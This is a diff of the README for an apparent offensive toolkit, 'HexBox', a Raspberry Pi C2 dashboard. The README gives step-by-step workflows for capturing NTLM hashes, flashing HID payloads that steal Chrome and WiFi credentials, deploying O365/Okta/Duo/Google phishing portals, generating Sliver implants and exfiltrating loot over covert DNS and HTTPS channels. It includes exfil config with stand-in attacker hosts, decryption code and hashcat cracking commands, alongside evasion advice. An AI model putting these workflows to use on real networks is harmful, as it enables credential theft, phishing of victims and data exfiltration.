+| Section | Source |
+|---------|--------|
+| **NTLM Hashes** | Responder logs — auto-parsed, deduplicated |
+| **WiFi Credentials** | `wifi_steal.ducky` output — SSID + plaintext password |
+| **Network Map** | nmap XML — sortable host/service/role table |
+| **Chrome Databases** | `browser_exfil.ducky` — DPAPI-encrypted Login Data files |
+| **System Profiles** | `sysinfo.ps1` / `ad_recon.ps1` — hostname, domain, admins, AV |
+| **BloodHound Data** | `bloodhound_collect.ps1` — one-click upload to BloodHound CE |
+| **PCAP Analysis** | Packet Squirrel captures — tshark-extracted credentials and stats |
+| **Portal Captures** | Evil Portal phishing — username/password/timestamp |
+| **Cracked Passwords** | hashcat output — auto-updates when `cracked.txt` changes |
+
+### Payloads Tab
+
+- **Payload Builder**: Select type → enter callback IP/port/delay → click Build. Generates ready-to-deploy DuckyScript. Download or push directly to the OMG Plug.
+- **Evil Portal**: Select template (O365/Okta/Duo/Google) → set catcher IP:port → Preview, Download, or Deploy to Pineapple.
+
+### Loot Tab
+
+File tree of `~/hexbox/loot/` grouped by category. Click any file to download.
+
+### Logs Tab
+
+Tail any service log (C2, Responder, Bettercap, hashcat, Sliver, Kismet) with configurable line count.
+
+### Report Tab
+
+One-click HTML engagement report. Fill in engagement name, target, and notes; click Generate. The report is self-contained HTML covering all intel categories and saved to `loot/reports/`.
+
+### War-Drive Tab
+
+| Control | Action |
+|---------|--------|
+| **▶ Start Kismet** | Launches Kismet on the management interface |
+| **■ Stop Kismet** | Stops the Kismet process |
+| **⟳ Refresh** | Polls Kismet REST API for new networks |
+| **GPS bar** | Shows current coordinates from gpsd (if connected) |
+| **AP table** | SSID, BSSID, channel, signal, encryption, GPS — sortable |
+| **Leaflet map** | Interactive map with color-coded markers: green=open, red=encrypted |
+| **Export CSV** | Download for Excel / LibreOffice |
+| **Export KML** | Download for Google Earth / QGIS |
 
 ---
 
-## 🎮 Usage
+## 🔫 Engagement Workflows
 
-### Start the C2 Dashboard
-```bash
-sudo python3 ~/hexbox/c2/hexbox_c2.py
+### Physical Access — Quick Credential Harvest
+
 ```
-Browse to `http://<pi-ip>:1337`. On first launch, the access token is printed to the console. Set `HEXBOX_TOKEN=<token>` to pin it permanently.
-
-The dashboard has **7 tabs**:
-
-| Tab | Purpose |
-|-----|---------|
-| **Devices** | Control all 7 devices + Pi local tools; Sliver C2 panel; **Covert Exfil** panel; software update; live activity feed |
-| **Intel** | NTLM hashes, WiFi credentials, network map, Chrome DBs, system profiles, BloodHound data; PCAP analyzer; portal credential captures; **Cracked Passwords** (hashcat feedback loop) |
-| **Payloads** | Build and download custom DuckyScript payloads; deploy to OMG Plug; Evil Portal builder with preview, download, and Pineapple deploy |
-| **Loot** | File browser with one-click download for any captured file |
-| **Logs** | Real-time log tail for all services (Responder, Bettercap, hashcat, Sliver, Kismet, etc.) |
-| **Report** | One-click HTML engagement report generator covering all intel |
-| **War-Drive** | Kismet controls; live AP table; GPS position bar; interactive Leaflet map; CSV and KML export |
-
-### Credential Catcher
-
-Run alongside the dashboard to receive payload callbacks:
-```bash
-python3 ~/hexbox/c2/catcher.py
+1. Connect HexBox to target wired network
+2. Start Responder  [Devices → Pi Local → Responder]
+3. Start Bettercap  [Devices → Pi Local → Bettercap MITM]
+4. Wait — NTLM hashes appear live in Intel tab
+5. Launch Hashcat   [Devices → Pi Local → Hashcat]
+6. Cracked plaintexts appear automatically in Intel → Cracked Passwords
 ```
 
-| Endpoint | Payload | Description |
-|----------|---------|-------------|
-| `POST /upload` | `browser_exfil.ducky` | Base64 Chrome Login DB |
-| `POST /wifi` | `wifi_steal.ducky` | WiFi profile plaintext dump |
-| `POST /sysinfo` | `sysinfo.ducky` / `ad_recon.ducky` / Bunny | Base64 JSON sysinfo blob |
-| `POST /bloodhound` | `bloodhound_collect.ducky` | Base64 BloodHound v5 JSON |
-| `POST /portal` | Evil Portal templates | Phishing credential capture (username/password/portal/host) |
-| `GET /serve/<name>` | All | Serves payload files to stagers |
+### HID Attack — Windows Credential Dump
 
-### One-Shot Engagement Mode
-```bash
-sudo bash ~/hexbox/scripts/engage.sh 10.10.0.0/24
 ```
-Fires up everything — Pineapple, Responder, credential catcher, dashboard, reverse shell listeners — in one shot. Press **Ctrl+C** to cleanly stop all services.
-
-### Deploy a Hak5 Payload
-1. Plug device into target environment
-2. Hit the corresponding button in the dashboard
-3. Watch loot stream into `~/hexbox/loot/`
-
-### OPSEC Hardening (Run Before Going On-Site)
-```bash
-bash ~/hexbox/scripts/opsec.sh
-```
-Rotates MACs, spoofs hostname, suppresses bash history, and encrypts existing loot with GPG AES-256.
-
-### Bash Bunny Payload Installation
-
-From the dashboard's **Devices → Bash Bunny** card:
-- **Net Recon** — SSH-triggered recon (ARP scan + nmap) results appear in `/bunny/loot`
-- **Pull Loot** — SFTP pull from `/tmp/bb_recon/` or `/root/loot/` to `loot/bunny/`
-- **Install Switch1** — Copies `payloads/bunny_recon.sh` to `/root/udisk/payloads/switch1/payload.sh` via SFTP
-- **Install Switch2** — Copies `payloads/bunny_exfil.sh` to `/root/udisk/payloads/switch2/payload.sh` via SFTP
-
-### Flipper Zero Serial Bridge
-
-Connect your Flipper Zero via USB. Dashboard auto-detects `/dev/ttyACM0` (configurable in `config.json → flipper.serial_port`). Install pyserial first:
-```bash
-pip install pyserial
-```
-Dashboard buttons send CLI commands to the Flipper and display output.
-
-### Sliver C2
-
-Install Sliver on the Pi:
-```bash
-curl https://sliver.sh/install | sudo bash
-```
-From the **Devices → Sliver C2** panel:
-1. Click **Start Server** to launch `sliver-server daemon`
-2. Select OS/arch/format and a listener URL, then click **Generate Implant**
-3. Active sessions appear automatically in the panel
-4. Generated implants are saved to `loot/implants/` and downloadable from the dashboard
-
-### BloodHound Auto-Ingest
-
-1. Deploy `bloodhound_collect.ducky` on an OMG Plug or type it via a Bash Bunny switch
-2. The PowerShell script collects users, computers, groups, and domains with real SIDs and POSTs BloodHound v5 JSON to `catcher.py /bloodhound`
-3. Data lands in `loot/bloodhound/`
-4. In the **Intel → BloodHound Data** section, click **Upload to BloodHound** to push directly to BloodHound CE
-
-Configure BloodHound CE credentials in `config.json → bloodhound`.
-
-### Evil Portal Phishing
-
-From the **Payloads → Evil Portal** panel:
-1. Select a template (O365 / Okta / Duo / Google)
-2. Enter your HexBox catcher IP and port (defaults to `10.0.0.99:8000`)
-3. Optionally override the post-submit redirect URL
-4. Click **Preview** to test the portal in your browser, **Download** to get the HTML, or **Deploy to Pineapple** to SSH-push it directly to `/etc/evilportal/portal.html`
-
-Captured credentials appear in **Intel → Portal Captures** with timestamp, portal type, username, and password. All entries are persisted to `loot/portals/captures.json`.
-
-### PCAP Analysis
-
-1. Copy packet captures to `~/hexbox/loot/pcaps/` (`.pcap` or `.pcapng`)
-2. Open the **Intel** tab and scroll to **PCAP Analysis**
-3. Select a file from the dropdown and click **Analyze**
-
-Results show protocol hierarchy, HTTP Basic/form credentials, FTP/SMTP/Telnet cleartext, DNS queries, and top hosts. Requires `tshark`:
-```bash
-sudo apt install tshark
+1. Build payload  [Payloads → Browser Credential Exfil]
+2. Enter HexBox IP (where catcher.py is running)
+3. Download the .ducky file → flash to OMG Plug or Bash Bunny
+4. Plug into target USB port
+5. Chrome Login DB arrives in loot/creds/; appears in Intel → Chrome Databases
 ```
 
-You can also run analysis from the command line:
-```bash
-python3 ~/hexbox/c2/parse_pcap.py loot/pcaps/capture.pcap --json
+### Wireless Attack — Evil Portal Campaign
+
+```
+1. Start WiFi Pineapple  [Devices → Pineapple]
+2. Build Evil Portal     [Payloads → Evil Portal → O365 template]
+3. Set catcher IP:port, set redirect URL, click Deploy to Pineapple
+4. Start management AP + portal
+5. Victims connect → credentials stream into Intel → Portal Captures
+```
+
+### Active Directory Enumeration
+
+```
+1. Deploy bloodhound_collect.ducky via OMG Plug on a domain-joined machine
+2. BloodHound v5 JSON POSTs to catcher.py → saved in loot/bloodhound/
+3. Click Upload to BloodHound  [Intel → BloodHound Data]
+4. Open BloodHound CE → run attack path queries
 ```
 
 ### GPS War-Drive
 
-1. Plug in a GPS receiver (GPSd-compatible) and start `gpsd`
-2. Start Kismet: click **▶ Start Kismet** in the **War-Drive** tab (or `sudo kismet` manually)
-3. The AP table populates in real time; click **Refresh** to poll Kismet for new networks
-4. GPS coordinates update automatically via the **GPS** bar at the top of the tab
-5. Click **Export CSV** or **Export KML** to download for QGIS / Google Earth
-
-Configure Kismet credentials in `config.json → kismet` (default: `kismet:kismet` at `localhost:2501`).
-
-### Covert Loot Exfiltration
-
-Configure your exfil channel in `config.json → exfil` (or run `setup/configure.sh`):
-
-```json
-"exfil": {
-  "dns_domain":      "exfil.attacker.com",
-  "dns_server":      "attacker-ns-ip",
-  "https_url":       "https://attacker.com/upload",
-  "https_token":     "secret-bearer-token",
-  "aes_key":         "your-32-byte-aes-key-here!!!!!",
-  "https_verify_tls": true
-}
+```
+1. Connect GPS receiver (any GPSd-compatible USB/serial device)
+2. sudo systemctl start gpsd
+3. Start Kismet  [War-Drive tab → ▶ Start Kismet]
+4. Drive target area — AP table and map populate in real time
+5. Export KML → open in Google Earth for site report
 ```
 
-From the **Devices → Covert Exfil** panel:
-1. Select method: **HTTPS** (default) or **DNS**
-2. Choose target: **All loot (zip)** or a specific file from the dropdown
-3. Click **↑ Send** — loot is zipped, gzip-compressed, AES-256-GCM encrypted, and sent
-4. The log panel shows per-session send status; **Status** button refreshes config/file list
-
-From the command line:
-```bash
-python3 ~/hexbox/c2/exfil.py https --config ~/hexbox/config.json
-python3 ~/hexbox/c2/exfil.py dns   --config ~/hexbox/config.json --file creds/host_wifi.txt
-```
-
-**Receiver-side decryption** (Python example):
-```python
-from Crypto.Cipher import AES
-import base64, gzip, hashlib
-
-key = hashlib.sha256(b"your-32-byte-aes-key-here!!!!!").digest()
-blob = base64.b64decode(received_base64)
-nonce, tag, ct = blob[:12], blob[12:28], blob[28:]
-data = gzip.decompress(AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag))
-```
-
-### Mobile Companion App (PWA)
-
-1. Connect your phone to the same network as HexBox
-2. Navigate to `http://<hexbox-ip>:1337/mobile` in your mobile browser
-3. Tap **Add to Home Screen** (Android Chrome) or the share icon → **Add to Home Screen** (iOS Safari)
-
-The mobile dashboard shows a live ops summary, active processes, war-drive network count, and a real-time event feed. It auto-refreshes every 30 seconds and stays connected via SSE. The view is **read-only** — no attack controls are available on the mobile view.
-
-### Cracked Password Feedback Loop
-
-Cracked passwords appear automatically in the **Intel → Cracked Passwords** section:
-1. Capture NTLMv2 hashes via Responder (Devices → Pi Local → Responder)
-2. Launch Hashcat from the dashboard (Devices → Pi Local → Hashcat)
-3. When `loot/cracked.txt` is updated by hashcat, the loot watcher fires a `hash_cracked` SSE event
-4. A toast notification appears on the dashboard; the Intel tab badge updates; the cracked table reloads
-5. Click **Copy Plaintexts** to copy all `user:password` pairs to clipboard
-
-Cracked table shows: username, domain, plaintext password, hash type, and hash preview. Both NTLMv2 (`USER::DOMAIN:...:plaintext`) and simple `HASH:plaintext` formats are parsed.
+### Covert Exfiltration
 
 ```
-hexbox/
-├── config.json                      # ← Edit this: all IPs, credentials, and exfil config
-├── requirements.txt                 # Python dependencies
-├── setup/
-│   ├── hexbox_setup.sh              # Base provisioning (run once on fresh Pi)
-│   ├── configure.sh                 # Interactive one-time configuration (now includes exfil settings)
-│   └── install_dependancies.sh      # Install Python deps from requirements.txt
-├── c2/
-│   ├── hexbox_c2.py                 # Main Flask C2 dashboard (Phase 6: exfil, mobile PWA, cracked pw loop)
-│   ├── catcher.py                   # Credential receiver: Chrome, WiFi, sysinfo, BloodHound JSON, portal captures
-│   ├── parse_loot.py                # Loot intelligence: hash parsing, nmap XML, WiFi, BloodHound, cracked pw, report gen
-│   ├── parse_pcap.py                # PCAP analysis: tshark protocol hierarchy, HTTP/FTP/SMTP/Telnet creds, DNS
-│   └── exfil.py                     # Encrypted loot exfil: AES-256-GCM + gzip over DNS subdomains or HTTPS POST
-├── payloads/
-│   ├── portals/
-│   │   ├── o365.html                # Evil Portal: Microsoft O365 phishing template
-│   │   ├── okta.html                # Evil Portal: Okta phishing template
-│   │   ├── duo.html                 # Evil Portal: Duo Security phishing template
-│   │   └── google.html              # Evil Portal: Google phishing template
-│   ├── reverse_shell.ducky          # OMG: Windows reverse shell
-│   ├── browser_exfil.ducky          # OMG: Chrome credential theft
-│   ├── wifi_steal.ducky             # OMG: WiFi profile dump
-│   ├── sysinfo.ducky                # OMG: Windows system profiling
-│   ├── ad_recon.ducky               # OMG: Active Directory enumeration
-│   ├── bloodhound_collect.ducky     # OMG: BloodHound v5 JSON collection
-│   ├── chrome.ps1                   # PowerShell DPAPI exfil stager
-│   ├── sysinfo.ps1                  # System recon: hostname/domain/admins/AV
-│   ├── ad_recon.ps1                 # AD enumeration via .NET LDAP (no module required)
-│   ├── bloodhound_collect.ps1       # BloodHound v5 data collector (users/computers/groups/domains with real SIDs)
-│   ├── bunny_recon.sh               # Bash Bunny Switch 1: ECM net recon → exfil to HexBox
-│   ├── bunny_exfil.sh               # Bash Bunny Switch 2: HID+ECM Windows credential dump
-│   ├── sharkjack_recon.sh           # Shark Jack auto-recon
-│   ├── squirrel_mitm.sh             # Packet Squirrel transparent MITM
-│   ├── turtle_foothold.sh           # LAN Turtle module provisioning
-│   └── turtle_receiver.sh           # C2-side tunnel receiver setup
-├── scripts/
-│   ├── engage.sh                    # Master launch + graceful shutdown
-│   ├── opsec.sh                     # MAC rotation, GPG loot encryption
-│   ├── pineapple_auto.py            # Pineapple REST API automation
-│   └── preflight.py                 # Pre-deployment validation
-├── loot/                            # Captured data lands here (auto-created)
-│   ├── creds/                       # Chrome DBs, WiFi profiles, sysinfo JSON
-│   ├── nmap/                        # Nmap XML + text scan results
-│   ├── handshakes/                  # WPA .cap / .pcapng files
-│   ├── pcaps/                       # Packet Squirrel + tshark analysis PCAPs
-│   ├── portals/                     # Evil Portal credential captures (captures.json)
-│   ├── wardrive/                    # Kismet war-drive data (networks.json cache)
-│   ├── cracks/                      # Hashcat scratch (ntlmv2_hashes.txt, cracked.txt)
-│   ├── shark/                       # Shark Jack loot
-│   ├── bunny/                       # Bash Bunny recon output
-│   ├── bloodhound/                  # BloodHound v5 JSON files
-│   ├── implants/                    # Generated Sliver implants
-│   └── reports/                     # Generated HTML engagement reports
-└── logs/                            # Operational logs (c2.log, responder.log, hashcat.log, etc.)
+1. Configure exfil channel in config.json → exfil (or run setup/configure.sh)
+2. Set a strong, unique AES key — the default key is public!
+3. Devices → Covert Exfil → select method (HTTPS preferred on monitored nets)
+4. Select target (all loot or specific file)
+5. Click ↑ Send — runs in background, logs status in exfil panel
 ```
 
 ---
 
-## 🛡️ OPSEC Notes
+## 📡 Credential Catcher
 
-- **Always run `scripts/opsec.sh` before deployment** to rotate MACs and harden the hostname
-- HexBox encrypts loot at rest using GPG AES-256 — set a strong passphrase
-- The C2 dashboard binds to `0.0.0.0:1337` — firewall it to your management interface only
-- Consider routing Pi callbacks through Tor or a VPN for off-site C2
-- DuckyScript payloads are **plaintext on the OMG Plug** — assume they can be recovered if the device is captured
-- `config.json` contains device passwords — do not commit it with real credentials to a public repo
-- Bash Bunny payloads installed via the dashboard are stored **on the device unencrypted** — factory reset if captured
-- Sliver operator config (`~/.sliver/hexbox-operator.cfg`) grants full C2 access — protect the Pi accordingly
-- BloodHound password in `config.json` is plaintext; use `config.local.json` (gitignored) for production credentials
-- Generated Sliver implants in `loot/implants/` are live malware — ensure the Pi is air-gapped or firewalled from untrusted networks
-- Evil Portal templates are deployed to the Pineapple in cleartext via SSH — ensure the management network is isolated
-- `loot/portals/captures.json` contains plaintext victim credentials — encrypt loot with `scripts/opsec.sh` before extraction
-- Kismet logs to disk and can fill your SD card quickly during extended war-drives — monitor disk usage with the dashboard log viewer
-- **Exfil AES key** in `config.json` is the single point of failure for exfil OPSEC — use a strong random key and rotate per engagement; never commit a real key to this repo
-- **DNS exfil** generates anomalous DNS traffic with long random subdomains — use sparingly on monitored networks; throttle is 50ms between packets
-- **Mobile PWA** at `/mobile` is protected by the same session auth as the main dashboard — ensure your phone browser has a valid session cookie or pass `X-HexBox-Token` header
+`catcher.py` is a separate Flask server (port 8000) that receives callbacks from deployed payloads.
+
+```bash
+python3 ~/hexbox/c2/catcher.py
+```
+
+| Endpoint | Method | Payload Source | Data Saved |
+|----------|--------|---------------|------------|
+| `/upload` | POST | `browser_exfil.ducky` | Base64-encoded Chrome Login Data → `loot/creds/<host>_chrome.db` |
+| `/wifi` | POST | `wifi_steal.ducky` | WiFi profile plaintext dump → `loot/creds/<host>_wifi.txt` |
+| `/sysinfo` | POST | `sysinfo.ps1` / `ad_recon.ps1` / Bunny | Base64 sysinfo JSON → `loot/creds/<host>_sysinfo.json` |
+| `/bloodhound` | POST | `bloodhound_collect.ps1` | Base64 BloodHound v5 JSON → `loot/bloodhound/<host>_<type>.json` |
+| `/portal` | POST | Evil Portal templates | Phishing capture → `loot/portals/captures.json` |
+| `/serve/<name>` | GET | All stagers | Serves any file from `payloads/` directory |
+
+> **Security note:** Catcher endpoints are intentionally unauthenticated — deployed payloads running on target machines have no mechanism to carry a secret. **Firewall port 8000 to your engagement network only.** Never expose catcher to the internet.
+
+---
+
+## 📤 Covert Exfiltration
+
+`exfil.py` packages, compresses, encrypts, and exfiltrates loot over covert channels.
+
+### Encryption
+
+All exfil traffic is protected by **AES-256-GCM** (authenticated encryption):
+- Key derivation: SHA-256 of your `aes_key` string → 32-byte key
+- Per-session random 12-byte nonce prepended to ciphertext
+- 16-byte GCM authentication tag follows nonce
+- Payload gzip-compressed before encryption
+
+### DNS Channel
+
+```
+{seq:04d}.{chunk_base32}.{session_id}.exfil.{domain}
+```
+- Pure stdlib `socket` — no dnspython dependency
+- 50ms throttle between packets to avoid rate limits
+- Terminator packet: `done.{total:04d}.{session_id}.exfil.{domain}`
+
+**Set up the receiver** on your authoritative nameserver (example using `tcpdump`):
+```bash
+sudo tcpdump -i eth0 -n 'udp port 53' | grep '\.exfil\.'
+# Reassemble: sort by sequence, base32-decode chunks, AES-GCM decrypt
+```
+
+### HTTPS Channel
+
+POSTs `{"session": "...", "ts": "...", "data": "<base64_ciphertext>", "size": N}` to your endpoint.
+
+**Receiver-side decryption:**
+```python
+from Crypto.Cipher import AES
+import base64, gzip, hashlib
+
+key = hashlib.sha256(b"your-aes-key-here").digest()
+blob = base64.b64decode(received_data_field)
+nonce, tag, ct = blob[:12], blob[12:28], blob[28:]
+plaintext = gzip.decompress(
+    AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)
+)
+# plaintext is a zip archive — extract to access loot files
+```
+
+### CLI Usage
+
+```bash
+# Exfil all loot via HTTPS
+python3 ~/hexbox/c2/exfil.py https --config ~/hexbox/config.json
+
+# Exfil a single file via DNS
+python3 ~/hexbox/c2/exfil.py dns \
+  --config ~/hexbox/config.json \
+  --file creds/HOST_wifi.txt
+```
+
+---
+
+## 📱 Mobile Companion App
+
+A read-only PWA companion dashboard, accessible from any phone on your network.
+
+### Install
+
+1. Connect your phone to the same network as HexBox
+2. Navigate to `http://<pi-ip>:1337/mobile` in your mobile browser — **while already logged in** to the dashboard
+3. **Android (Chrome):** tap the menu → **Add to Home Screen**
+4. **iOS (Safari):** tap the share icon → **Add to Home Screen**
+
+> The mobile page embeds your API token at serve time. To stay authenticated after installing the app, always launch it while the main dashboard session is active, or re-visit the `/mobile` URL in browser to refresh the token embed.
+
+### Features
+
+- Live ops summary: hash count, WiFi creds, hosts, cracked passwords, portal captures, war-drive network count
+- Active process list (shows running Responder/Bettercap/hashcat/Sliver/Kismet)
+- Real-time event feed via SSE: new loot, process starts/stops, crack events
+- Auto-refresh every 30 seconds
+- **Read-only** — no attack controls on mobile
+
+---
+
+## 📁 File Structure
+
+```
+hexbox/
+├── config.json                       # ← Edit this: all IPs, credentials, exfil settings
+├── requirements.txt                  # Python dependencies
+│
+├── setup/
+│   ├── hexbox_setup.sh               # One-time provisioning: tools + Python deps
+│   ├── configure.sh                  # Interactive configuration wizard
+│   └── install_dependancies.sh       # Install Python deps only
+│
+├── c2/
+│   ├── hexbox_c2.py                  # Main Flask C2 dashboard (all tabs + routes)
+│   ├── catcher.py                    # Credential receiver (port 8000)
+│   ├── parse_loot.py                 # Intel engine: hash/WiFi/nmap/BloodHound/cracked password parsing
+│   ├── parse_pcap.py                 # PCAP analysis: tshark-driven credential + protocol extraction
+│   └── exfil.py                      # Encrypted exfil: AES-256-GCM over DNS or HTTPS
+│
+├── payloads/
+│   ├── portals/
+│   │   ├── o365.html                 # Evil Portal: Microsoft O365 phishing template
+│   │   ├── okta.html                 # Evil Portal: Okta SSO phishing template
+│   │   ├── duo.html                  # Evil Portal: Duo Security MFA phishing template
+│   │   └── google.html               # Evil Portal: Google sign-in phishing template
+│   │
+│   ├── reverse_shell.ducky           # OMG/Bunny: TCP reverse shell to HexBox
+│   ├── browser_exfil.ducky           # OMG/Bunny: Chrome credential theft via DPAPI
+│   ├── wifi_steal.ducky              # OMG/Bunny: saved WiFi profile dump
+│   ├── sysinfo.ducky                 # OMG/Bunny: Windows system profiling
+│   ├── ad_recon.ducky                # OMG/Bunny: Active Directory enumeration
+│   ├── bloodhound_collect.ducky      # OMG/Bunny: BloodHound v5 JSON collection
+│   │
+│   ├── chrome.ps1                    # PowerShell DPAPI exfil stager (called by browser_exfil.ducky)
+│   ├── sysinfo.ps1                   # Hostname/domain/admins/AV/IP collection
+│   ├── ad_recon.ps1                  # AD enumeration via .NET LDAP (no AD module required)
+│   ├── bloodhound_collect.ps1        # BloodHound v5 collection (users/computers/groups/domains with SIDs)
+│   │
+│   ├── bunny_recon.sh                # Bash Bunny Switch 1: ARP + nmap → exfil to HexBox
+│   ├── bunny_exfil.sh                # Bash Bunny Switch 2: HID+ECM Windows credential dump
+│   ├── sharkjack_recon.sh            # Shark Jack: auto-recon on plug-in
+│   ├── squirrel_mitm.sh              # Packet Squirrel: transparent inline MITM
+│   ├── turtle_foothold.sh            # LAN Turtle: module provisioning + AutoSSH
+│   └── turtle_receiver.sh            # C2-side: tunnel receiver setup
+│
+├── scripts/
+│   ├── engage.sh                     # Master launch + graceful Ctrl+C shutdown
+│   ├── opsec.sh                      # MAC randomization, GPG loot encryption, hostname spoof
+│   ├── pineapple_auto.py             # Pineapple REST API automation helpers
+│   └── preflight.py                  # Pre-deployment validation: GO / NO-GO
+│
+├── loot/                             # All captured data (auto-created, gitignored)
+│   ├── creds/                        # Chrome DBs, WiFi profiles, sysinfo JSON
+│   ├── nmap/                         # nmap XML + text scan results
+│   ├── handshakes/                   # WPA .cap / .pcapng handshake files
+│   ├── pcaps/                        # Packet Squirrel captures + uploaded PCAPs
+│   ├── portals/                      # Evil Portal credential captures (captures.json)
+│   ├── wardrive/                     # Kismet war-drive cache (networks.json)
+│   ├── cracks/                       # hashcat scratch: ntlmv2_hashes.txt, cracked.txt
+│   ├── shark/                        # Shark Jack recon output
+│   ├── bunny/                        # Bash Bunny loot
+│   ├── bloodhound/                   # BloodHound v5 JSON files
+│   ├── implants/                     # Generated Sliver implants
+│   └── reports/                      # Generated HTML engagement reports
+│
+└── logs/                             # Service logs (gitignored)
+    ├── c2.log                        # Dashboard + route activity
+    ├── responder.log
+    ├── bettercap.log
+    ├── hashcat.log
+    └── kismet.log
+```
+
+---
+
+## 🛡️ OPSEC
+
+### Before Every Deployment
+
+```bash
+bash ~/hexbox/scripts/opsec.sh
+```
+
+This rotates MAC addresses, spoofs the hostname to a generic string, suppresses bash history, and GPG-encrypts existing loot.
+
+### Critical OPSEC Rules
+
+**Network exposure:**
+- Port 1337 (dashboard) binds to `0.0.0.0` — firewall it to your management VLAN or VPN tunnel only
+- Port 8000 (catcher) must be reachable by target machines for payload callbacks — isolate at the L2 level when possible
+- Never expose either port to the internet without a VPN in front
+
+**Credentials and keys:**
+- `config.json` contains plaintext device passwords and your exfil AES key — never commit it to a public repo; `.gitignore` excludes it
+- Change the exfil `aes_key` before every engagement — the default key is in the source code and provides zero security
+- `HEXBOX_TOKEN` should be set via environment variable, not hardcoded in `config.json`, in production
+
+**Physical capture:**
+- DuckyScript payloads are plaintext on the OMG Plug — assume they're recoverable if the device is seized; factory reset if captured
+- Bash Bunny payloads are installed unencrypted on the device — factory reset before surrendering
+- Sliver implants in `loot/implants/` are functional malware — air-gap or firewall the Pi from untrusted networks
+- Generated implants carry your C2 callback address — do not exfil them over the same channel you're attacking
+
+**Wireless and RF:**
+- Evil Portal phishing templates are pushed to the Pineapple in cleartext over SSH — use an isolated management network
+- DNS exfil generates anomalous traffic (long random subdomains) — use HTTPS exfil on monitored/SOC-managed networks
+- Kismet can fill your SD card rapidly on dense wireless environments — check disk space before long war-drives
+
+**Post-engagement:**
+- Run `scripts/opsec.sh` again after extraction to GPG-encrypt all loot before transit
+- Wipe `loot/` and `logs/` after client delivery; shred the SD card if retiring the Pi
+
+---
+
+## 🔧 Troubleshooting
+
+### Device won't connect
+
+```bash
+# Test SSH manually
+ssh root@172.16.42.1   # Pineapple
+ssh root@172.16.64.1   # Bash Bunny (arming mode only)
+
+# Check default IPs match your firmware version
+# Pineapple Mark VII: 172.16.42.1
+# Bash Bunny Mark II: 172.16.64.1 (not 172.16.42.1)
+```
+
+### Dashboard shows device as offline (red dot)
+
+The status check is a TCP connect to the device's SSH port. If the device is connected but shows red:
+1. Verify the IP in `config.json` matches the device's actual IP
+2. Check your Pi's routing: `ip route`; the device subnet must be reachable
+3. Bash Bunny: must be in **arming mode** (switch position 3) for SSH access
+
+### Responder not capturing hashes
+
+- Verify Responder is bound to the correct interface (`IFACE_RESPONDER` in `config.json → interfaces.responder`)
+- Ensure no other process is binding port 445: `sudo ss -tlnp | grep 445`
+- On modern Windows, LLMNR/NBT-NS may be disabled by GPO — try mDNS poisoning instead
+
+### hashcat fails / no GPU
+
+Hashcat will fall back to CPU on the Pi (slow). For faster cracking:
+```bash
+# Copy hashes to a machine with a GPU, crack there, copy cracked.txt back
+scp pi@<pi-ip>:~/hexbox/loot/ntlmv2_hashes.txt .
+hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
+scp cracked.txt pi@<pi-ip>:~/hexbox/loot/
+# Dashboard detects the file change and updates Intel → Cracked Passwords automatically
+```
+
+### Kismet no networks / GPS not updating
+
+```bash
+# Verify Kismet is running
+curl -u kismet:kismet http://localhost:2501/system/status.json
+
+# Check GPS
+gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock   # adjust device path
+cgps                                        # live GPS readout
+```
+
+### Sliver generate fails
+
+```bash
+# Check sliver-server is running
+pgrep sliver-server
+
+# Verify operator config exists
+ls ~/.sliver/hexbox-operator.cfg
+
+# Generate config if missing
+sliver-server operator --name hexbox --lhost 127.0.0.1 --save ~/.sliver/hexbox-operator.cfg
+```
+
+### Catcher not receiving data
+
+- Verify `catcher.py` is running: `pgrep -a python3 | grep catcher`
+- Check the IP in your DuckyScript payload matches the Pi's IP (run `setup/configure.sh` to update all payloads automatically)
+- Ensure port 8000 is reachable from the target machine: `curl http://<pi-ip>:8000/`
+
+### BloodHound upload fails
+
+```bash
+# Test BloodHound CE connectivity
+curl -u admin:BloodHound! http://localhost:8080/api/v2/bloodhound-users
+# Verify credentials in config.json → bloodhound match your BloodHound CE setup
+```
+
+### Pre-flight check fails
+
+```bash
+sudo python3 scripts/preflight.py
+# Read the NO-GO items carefully — each has a suggested fix
+# Common causes: missing tool, wrong interface name, device not connected
+```
 
 ---
 
 ## 🗺️ Roadmap
 
 ### Completed
-- ✅ Phase 1: Core C2 dashboard, device control, process management
-- ✅ Phase 2: Config-driven interfaces, parallel status, tabbed dashboard, loot/log APIs, auth, security hardening
-- ✅ Phase 3: SSE live feed, intel engine (hash/WiFi/nmap/sysinfo parsing), payload builder, engagement sessions, hashcat, PMKID, AD recon, HTML report generator
-- ✅ Phase 4: Bash Bunny integration, Flipper Zero serial bridge, Sliver C2 implant generation, BloodHound CE auto-ingest
-- ✅ Phase 5: Custom Evil Portal templates (O365, Okta, Duo, Google), PCAP analysis dashboard (tshark protocol/credential stats), GPS war-driving mode with Kismet integration
-- ✅ Phase 6: Encrypted loot exfil over DNS/HTTPS covert channels, Mobile PWA companion app, cracked password feedback loop (hashcat → Intel tab)
+
+| Phase | Highlights |
+|-------|-----------|
+| **Phase 1–2** | Core Flask C2, config-driven setup, parallel device status, tabbed dashboard, token auth, loot/log APIs |
+| **Phase 3** | SSE live feed, full intel engine (hash/WiFi/nmap/sysinfo parsing), DuckyScript payload builder, engagement sessions, hashcat integration, AD recon, HTML report generator |
+| **Phase 4** | Bash Bunny SSH integration, Flipper Zero serial bridge, Sliver C2 implant generation, BloodHound CE auto-ingest |
+| **Phase 5** | Custom Evil Portal templates (O365/Okta/Duo/Google), PCAP analysis dashboard, GPS war-driving with Kismet, Leaflet map, CSV/KML export |
+| **Phase 6** | AES-256-GCM encrypted exfil over DNS subdomains and HTTPS, Mobile PWA companion app, hashcat cracked password feedback loop, full security audit + remediation |
 
 ### Upcoming
-- [ ] Automated C2 callback via Sliver beacons on exfil completion
-- [ ] Multi-engagement session isolation (separate loot dirs per job)
-- [ ] Push notifications to mobile via WebPush / ntfy.sh
+
+- [ ] Multi-engagement isolation — separate `loot/` directories per job with named workspaces
+- [ ] Automated Sliver beacon on exfil completion — trigger exfil when implant checks in
+- [ ] Push notifications to mobile via [ntfy.sh](https://ntfy.sh/) or WebPush
+- [ ] Automated Evil Portal credential relay — forward captured creds to the real portal to avoid victim lockout
+- [ ] Packet Squirrel PCAP streaming — live tshark feed direct to Intel tab without manual upload
 
 ---
 
 ## 🤝 Contributing
 
